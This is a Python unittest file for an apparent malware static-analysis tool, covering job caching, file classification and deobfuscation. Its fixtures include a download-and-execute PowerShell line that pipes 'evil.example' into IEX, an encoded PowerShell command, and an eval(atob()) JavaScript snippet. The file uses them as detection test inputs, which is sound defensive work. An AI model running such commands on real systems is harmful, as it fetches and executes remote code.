import os
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from app.modules.job_cache import cache_job_inventory, cached_file_path, load_manifest  # noqa: E402
from app.modules.static_analysis.types import classify_file  # noqa: E402
from app.modules.static_analysis.engine import analyze_file  # noqa: E402
from app.modules.static_analysis.deobfuscator import deobfuscate_text  # noqa: E402


class TestJobCache(unittest.TestCase):
    def test_cache_and_reload_inventory(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            sample = base / 'sample.ps1'
            sample.write_text('powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBqAGUAQwB0AEkAIAAoAEkAbgB0AEUAbgB0AHAAKQ==', encoding='utf-8')
            inventory = [{
                'filename': 'sample.ps1',
                'path': 'sample.ps1',
                'local_path': str(sample),
                'file_type': 'PS1',
                'size_bytes': sample.stat().st_size,
                'sha256': 'abc123def456' * 4,
            }]
            manifest = cache_job_inventory(base, 'job123', inventory)
            self.assertEqual(manifest['cached_files'], 1)
            self.assertTrue(cached_file_path(base, 'job123', 'abc123def456' * 4).is_file())
            loaded = load_manifest(base, 'job123')
            self.assertEqual(loaded['files'][0]['cached'], True)


class TestStaticAnalysisProfiles(unittest.TestCase):
    def test_script_profile(self):
        with tempfile.NamedTemporaryFile('w', suffix='.js', delete=False) as handle:
            handle.write('eval(atob("aGVsbG8=")); function run(){return 1;}')
            path = Path(handle.name)
        try:
            profile = classify_file(path)
            self.assertEqual(profile.category, 'script')
        finally:
            path.unlink(missing_ok=True)

    def test_pdf_profile(self):
        with tempfile.NamedTemporaryFile('wb', suffix='.pdf', delete=False) as handle:
            handle.write(b'%PDF-1.4\n/JavaScript\n')
            path = Path(handle.name)
        try:
            profile = classify_file(path)
            self.assertEqual(profile.category, 'pdf')
        finally:
            path.unlink(missing_ok=True)


class TestStaticAnalysisEngine(unittest.TestCase):
    def test_analyze_script_file(self):
        with tempfile.NamedTemporaryFile('w', suffix='.ps1', delete=False) as handle:
            handle.write('Invoke-WebRequest http://evil.example/a | IEX')
            path = Path(handle.name)
        try:
            report = analyze_file(path, filename='test.ps1', declared_type='PS1')
            self.assertEqual(report['status'], 'completed')
            self.assertIn(report['static_verdict']['verdict'], {'malicious', 'suspicious', 'inconclusive', 'clean'})
            self.assertTrue(report['typed_analysis']['language'] == 'powershell')
        finally:
            path.unlink(missing_ok=True)

    def test_analyze_json_file(self):
        with tempfile.NamedTemporaryFile('w', suffix='.json', delete=False) as handle:
            handle.write('{"cmd":"powershell -enc abc","url":"http://example.com"}')
            path = Path(handle.name)
        try:
            report = analyze_file(path, filename='config.json')
            self.assertEqual(report['profile']['category'], 'structured_text')
            self.assertIn('universal', report)
        finally:
            path.unlink(missing_ok=True)


class TestDeobfuscator(unittest.TestCase):
    def test_base64_recovery(self):
        payload = 'echo ' + __import__('base64').b64encode(b'http://malicious.example/payload').decode()
        result = deobfuscate_text(payload)
        self.assertGreaterEqual(result['attempts'], 0)


if __name__ == '__main__':
    unittest.main()
